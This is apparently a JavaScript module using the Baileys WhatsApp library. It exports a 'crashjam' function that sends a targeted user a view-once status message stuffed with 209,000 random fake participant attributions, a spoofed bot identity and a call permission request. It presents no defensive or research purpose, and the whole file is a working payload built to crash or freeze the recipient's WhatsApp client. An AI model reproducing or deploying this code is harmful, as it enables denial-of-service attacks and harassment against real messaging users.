
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function crashjam(SYxS7, target) {
    const SABANA_LOVE = {
        messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
            }
        },
        interactiveResponseMessage: {
            contextInfo: {
                remoteJid: "status@broadcast",
                fromMe: true,
                isQuestion: true,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "FLIX"
                },
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 209000 }, () => ({
                    participant: `${
                        ['41','91','90','31','40'][Math.floor(Math.random()*5)]
                    }${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
                    type: 1
                }))
            },
            body: {
                text: "",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "kkk",
                version: 3
            }
        }
    };

    const SABIR7718_LOVE_SABANA = {
        viewOnceMessage: {
            message: SABANA_LOVE
        }
    };

    await SYxS7.relayMessage("status@broadcast", SABIR7718_LOVE_SABANA, {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

module.exports = { crashjam };
